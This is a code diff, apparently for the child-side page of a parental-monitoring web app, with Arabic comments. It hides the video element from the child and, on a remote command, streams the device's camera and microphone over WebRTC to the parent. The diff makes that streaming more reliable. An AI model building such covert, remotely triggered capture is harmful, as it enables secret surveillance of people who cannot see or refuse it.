@@ -14,7 +14,6 @@
         button:hover { background: #0056b3; }
         .sos-btn { background: #dc3545; }
         .sos-btn:hover { background: #bd2130; }
-        /* إخفاء عنصر الفيديو تماماً من شاشة الطفل لكي لا يظهر عنده شيء */
         video { display: none; }
     </style>
 </head>
@@ -46,7 +45,6 @@
     <script>
         const socket = io();
         const statusP = document.getElementById('status');
-        const localVideo = document.getElementById('localVideo');
         let peerConnection;
         const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
@@ -90,6 +88,7 @@
             msgInput.value = '';
         }
 
+        // استقبال أوامر المراقبة وإنشاء اتصال WebRTC صحيح تماماً
         socket.on('execute_command', async (data) => {
             try {
                 let stream;
@@ -111,11 +110,14 @@
                 }
 
                 if (stream) {
-                    // إبقاء الفيديو مخفياً عند الطفل وإرسال البث بمسارات الصوت والصورة معاً
-                    localVideo.srcObject = stream;
+                    // إغلاق أي اتصال قديم إن وجد
+                    if (peerConnection) {
+                        peerConnection.close();
+                    }
 
                     peerConnection = new RTCPeerConnection(rtcConfig);
-                    
+
+                    // إضافة جميع مسارات الصوت والصورة إلى الاتصال قبل إرسال العرض
                     stream.getTracks().forEach(track => {
                         peerConnection.addTrack(track, stream);
                     });
@@ -128,6 +130,8 @@
 
                     const offer = await peerConnection.createOffer();
                     await peerConnection.setLocalDescription(offer);
+                    
+                    // إرسال العرض مع معرف الأب
                     socket.emit('webrtc_offer', { targetId: data.parentId, senderId: socket.id, offer: offer });
                 }
             } catch (err) {
